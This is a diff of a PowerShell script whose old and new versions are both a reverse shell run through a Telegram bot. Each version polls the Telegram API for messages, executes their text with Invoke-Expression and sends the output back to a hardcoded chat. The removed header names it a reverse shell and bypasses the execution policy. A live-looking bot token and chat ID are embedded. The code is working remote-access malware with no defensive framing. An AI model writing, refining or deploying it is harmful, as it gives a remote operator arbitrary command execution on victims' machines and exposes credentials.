@@ -1,74 +1,68 @@
-# Simple Telegram Reverse Shell
-param(
-    [string]$BotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
-    [string]$ChatID = "2047893044"
-)
+# Telegram Bot Token and Chat ID
+$BOT_TOKEN = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs"
+$CHAT_ID = "2047893044"
+$TELEGRAM_API = "https://api.telegram.org/bot$BOT_TOKEN"
 
-Set-ExecutionPolicy Bypass -Scope Process -Force
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
-function Send-Telegram {
-    param($Message)
+# Function to execute commands
+function Execute-Command {
+    param (
+        [string]$Command
+    )
     try {
-        $url = "https://api.telegram.org/bot$BotToken/sendMessage"
-        $body = @{chat_id=$ChatID; text=$Message} | ConvertTo-Json
-        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" | Out-Null
-        return $true
-    } catch { return $false }
+        $output = Invoke-Expression $Command 2>&1 | Out-String
+        return $output
+    }
+    catch {
+        return "Error executing command: $_"
+    }
 }
 
-function Get-Updates {
+# Function to send message to Telegram
+function Send-TelegramMessage {
+    param (
+        [string]$Message
+    )
     try {
-        $url = "https://api.telegram.org/bot$BotToken/getUpdates"
-        return Invoke-RestMethod -Uri $url -Method Get
-    } catch { return $null }
+        $uri = "$TELEGRAM_API/sendMessage"
+        $body = @{
+            chat_id = $CHAT_ID
+            text = $Message
+        } | ConvertTo-Json
+        Invoke-RestMethod -Uri $uri -Method Post -ContentType "application/json" -Body $body | Out-Null
+    }
+    catch {
+        Write-Error "Failed to send Telegram message: $_"
+    }
 }
 
-# Test connection first
-if (Send-Telegram "🔄 Testing connection...") {
-    Write-Host "Connection test successful!" -ForegroundColor Green
-} else {
-    Write-Host "Connection test failed. Check bot token and chat ID." -ForegroundColor Red
-    exit
-}
-
-$lastId = 0
-Write-Host "Reverse shell active. Waiting for commands..." -ForegroundColor Green
-
+# Main loop to poll for new messages
+$offset = 0
 while ($true) {
-    $updates = Get-Updates
-    if ($updates -and $updates.ok) {
+    try {
+        # Get updates from Telegram
+        $uri = "$TELEGRAM_API/getUpdates?offset=$offset"
+        $updates = Invoke-RestMethod -Uri $uri -Method Get
+
         foreach ($update in $updates.result) {
-            if ($update.update_id -gt $lastId -and $update.message -and $update.message.text) {
-                $lastId = $update.update_id
-                $cmd = $update.message.text
-                
-                Write-Host "Executing: $cmd" -ForegroundColor Yellow
-                
-                if ($cmd -eq "exit") {
-                    Send-Telegram "🔌 Shell disconnected" | Out-Null
-                    exit
-                }
-                
-                try {
-                    $result = Invoke-Expression $cmd 2>&1 | Out-String
-                    if (!$result) { $result = "Command executed (no output)" }
-                } catch {
-                    $result = "Error: $($_.Exception.Message)"
-                }
-                
-                # Split long messages
-                if ($result.Length -gt 4000) {
-                    $chunks = [regex]::Matches($result, ".{1,4000}")
-                    foreach ($chunk in $chunks) {
-                        Send-Telegram $chunk.Value | Out-Null
-                        Start-Sleep -Seconds 1
-                    }
-                } else {
-                    Send-Telegram $result | Out-Null
-                }
+            if ($update.message -and $update.message.chat.id -eq $CHAT_ID) {
+                $command = $update.message.text
+                $message_id = $update.message.message_id
+
+                # Execute the command and get output
+                $output = Execute-Command -Command $command
+
+                # Send the output back to Telegram
+                Send-TelegramMessage -Message "Command: $command`nOutput:`n$output"
+
+                # Update offset to mark message as processed
+                $offset = $update.update_id + 1
             }
         }
     }
+    catch {
+        Write-Error "Error in main loop: $_"
+    }
+
+    # Wait before polling again to avoid rate limits
     Start-Sleep -Seconds 2
 }
